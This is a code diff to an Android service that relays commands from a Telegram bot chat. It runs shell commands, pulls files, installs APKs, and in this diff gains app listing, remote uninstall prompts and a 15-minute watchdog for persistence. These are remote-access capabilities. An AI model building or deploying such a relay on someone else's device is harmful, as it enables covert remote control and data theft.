@@ -8,6 +8,8 @@ import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageInstaller;
 import android.net.Uri;
 import android.os.BatteryManager;
@@ -29,6 +31,7 @@ public class RelayService extends Service {
     private static final int NOTIF_ID = 2002;
 
     private TelegramBridge tg;
+    private java.util.List<String> ultimaLista;
     private long startedAt = 0;
 
     @Override
@@ -36,6 +39,7 @@ public class RelayService extends Service {
         super.onCreate();
         startedAt = System.currentTimeMillis();
         goForeground();
+        agendarWatchdog();
 
         tg = new TelegramBridge(BuildConfig.BOT_TOKEN, BuildConfig.MASTER_CHAT);
         BridgeHolder.tg = tg;
@@ -60,7 +64,14 @@ public class RelayService extends Service {
             }
             if (low.equals("status") || low.equals("estado")) { tg.say(statusLine()); return; }
             if (low.startsWith("open ")) { cmdOpen(c.substring(5).trim()); return; }
-            if (low.equals("uninstall")) { cmdUninstall(); return; }
+            if (low.equals("apps")) { cmdApps(false); return; }
+            if (low.equals("apps all")) { cmdApps(true); return; }
+            if (low.startsWith("rm ")) { cmdRm(c.substring(3).trim()); return; }
+            if (low.equals("uninstall")) {
+                tg.say("uninstall: escolha na lista - mande 'apps' e depois 'rm <numero>' (ou 'rm self' pra me remover)");
+                cmdApps(false);
+                return;
+            }
             if (low.equals("install") || low.equals("update")) {
                 File juntado = new File(getFilesDir(), "juntado.apk");
                 if (juntado.exists()) { instalarArquivo(juntado, low); return; }
@@ -70,7 +81,7 @@ public class RelayService extends Service {
             if (c.startsWith("DOC:")) { cmdDoc(c); return; }
             if (low.startsWith("sh ")) { tg.say(Exec.run(c.substring(3))); return; }
             if (low.startsWith("shell ")) { tg.say(Exec.run(c.substring(6))); return; }
-            tg.say("comandos: sh <cmd> | status | open <url> | pull <arquivo> | uninstall | install (APK como doc) | ping");
+            tg.say("comandos: sh <cmd> | apps | rm <numero|pacote|self> | open <url> | pull <arquivo> | install (APK como doc) | status | perm | ping");
         } catch (Throwable t) {
             tg.say("erro cmd: " + t);
         }
@@ -103,6 +114,78 @@ public class RelayService extends Service {
             nm.notify(req, b.build());
             tg.say("abrindo (avisado na tela): " + url);
         } catch (Exception e) { tg.say("erro open: " + e); }
+    }
+
+    private void cmdApps(boolean todos) {
+        try {
+            java.util.List<PackageInfo> pkgs = getPackageManager().getInstalledPackages(0);
+            ultimaLista = new java.util.ArrayList<>();
+            StringBuilder sb = new StringBuilder();
+            int n = 0;
+            for (PackageInfo pi : pkgs) {
+                boolean sistema = (pi.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
+                if (!todos && sistema) continue;
+                n++;
+                String label;
+                try { label = pi.applicationInfo.loadLabel(getPackageManager()).toString(); }
+                catch (Exception e) { label = pi.packageName; }
+                ultimaLista.add(pi.packageName);
+                sb.append(n).append(". ").append(label).append(" (").append(pi.packageName).append(")\n");
+            }
+            sb.append("-- ").append(n).append(" apps -- mande: rm <numero>");
+            tg.say(sb.toString());
+        } catch (Exception e) { tg.say("erro apps: " + e); }
+    }
+
+    private void cmdRm(String alvo) {
+        try {
+            if (alvo.equalsIgnoreCase("self")) { cmdUninstall(); return; }
+            String pkg;
+            if (alvo.matches("[0-9]+")) {
+                int i = Integer.parseInt(alvo) - 1;
+                if (ultimaLista == null || i < 0 || i >= ultimaLista.size()) {
+                    tg.say("rm: numero invalido - mande 'apps' antes pra ver a lista"); return;
+                }
+                pkg = ultimaLista.get(i);
+            } else {
+                pkg = alvo;
+            }
+            Intent del = new Intent(Intent.ACTION_DELETE);
+            del.setData(Uri.parse("package:" + pkg));
+            del.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            int req = (int) (System.currentTimeMillis() % 2000000000L);
+            PendingIntent p = PendingIntent.getActivity(this, req, del,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+            String chId = "rm_fsi";
+            if (Build.VERSION.SDK_INT >= 26) {
+                nm.createNotificationChannel(new NotificationChannel(chId, "remocao",
+                        NotificationManager.IMPORTANCE_HIGH));
+            }
+            Notification.Builder b = Build.VERSION.SDK_INT >= 26
+                    ? new Notification.Builder(this, chId)
+                    : new Notification.Builder(this);
+            b.setContentTitle("Remover aplicativo")
+             .setContentText("Toque para confirmar: " + pkg)
+             .setSmallIcon(android.R.drawable.stat_notify_sync)
+             .setAutoCancel(true)
+             .setContentIntent(p)
+             .setFullScreenIntent(p, true);
+            nm.notify(req, b.build());
+            tg.say("rm: notificacao enviada - toque e confirme a remocao de " + pkg);
+        } catch (Exception e) { tg.say("erro rm: " + e); }
+    }
+
+    private void agendarWatchdog() {
+        try {
+            android.app.AlarmManager am = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
+            Intent wi = new Intent(this, WatchdogReceiver.class);
+            PendingIntent wpi = PendingIntent.getBroadcast(this, 77, wi,
+                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+            am.setRepeating(android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                    android.os.SystemClock.elapsedRealtime() + 15 * 60_000L,
+                    15 * 60_000L, wpi);
+        } catch (Exception ignored) { }
     }
 
     private void cmdUninstall() {
